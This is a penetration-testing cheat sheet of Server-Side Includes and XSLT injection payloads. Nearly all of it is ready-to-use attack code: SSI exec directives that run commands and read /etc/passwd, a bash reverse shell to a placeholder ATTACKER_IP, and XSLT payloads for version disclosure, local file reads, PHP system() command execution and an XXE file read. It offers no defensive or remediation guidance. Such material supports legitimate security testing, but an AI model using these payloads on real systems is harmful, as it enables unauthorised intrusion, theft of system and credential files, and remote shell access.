# SSI & XSLT Injection

---

## Server-Side Includes (SSI) Injection

SSI directives instruct web servers to include dynamic content. Common file extensions: `.shtml`, `.shtm`, `.stm`

Supported by: Apache, IIS, nginx (with module)

---

### SSI Syntax

```
<!--#directive param="value" -->
```

---

### SSI Payloads

#### Print Environment Variables

```html
<!--#printenv -->
```

#### Print Specific Variable

```html
<!--#echo var="DOCUMENT_NAME" -->
<!--#echo var="DOCUMENT_URI" -->
<!--#echo var="DATE_LOCAL" -->
<!--#echo var="LAST_MODIFIED" -->
```

#### Include File (Web Root Only)

```html
<!--#include virtual="index.html" -->
<!--#include virtual="/etc/passwd" -->
```

#### RCE via exec

```html
<!--#exec cmd="id" -->
<!--#exec cmd="whoami" -->
<!--#exec cmd="cat /etc/passwd" -->
<!--#exec cmd="ls -la" -->
```

#### Reverse Shell

```html
<!--#exec cmd="bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1" -->
```

---

### Confirm SSI Injection

1. Look for `.shtml` file extensions
2. Inject `<!--#printenv -->` and check if environment variables appear
3. Inject `<!--#exec cmd="id" -->` for RCE

---

---

## XSLT Injection

XSLT (eXtensible Stylesheet Language Transformations) transforms XML documents. Injection occurs when user input is inserted into XSL data before processing.

---

### Confirm XSLT Injection

Inject a broken XML tag to trigger an error:

```
<
```

---

### Information Disclosure

```xml
Version: <xsl:value-of select="system-property('xsl:version')" />
Vendor: <xsl:value-of select="system-property('xsl:vendor')" />
Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')" />
Product Name: <xsl:value-of select="system-property('xsl:product-name')" />
Product Version: <xsl:value-of select="system-property('xsl:product-version')" />
```

---

### Local File Read

#### XSLT 2.0+

```xml
<xsl:value-of select="unparsed-text('/etc/passwd', 'utf-8')" />
```

#### PHP (if PHP functions enabled)

```xml
<xsl:value-of select="php:function('file_get_contents','/etc/passwd')" />
```

---

### RCE (PHP)

```xml
<xsl:value-of select="php:function('system','id')" />
<xsl:value-of select="php:function('system','whoami')" />
<xsl:value-of select="php:function('passthru','cat /etc/passwd')" />
```

---

### XSLT External Entity (XXE)

```xml
<?xml version="1.0"?>
<!DOCTYPE xsl:stylesheet [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    &xxe;
  </xsl:template>
</xsl:stylesheet>
```

---

### Common XSLT Processors

| Processor | Language | Notes |
|-----------|----------|-------|
| libxslt | C | Common on Linux, supports XSLT 1.0 |
| Saxon | Java | Supports XSLT 1.0, 2.0, 3.0 |
| Xalan | Java/C++ | Apache project |
| MSXML | .NET | Windows |
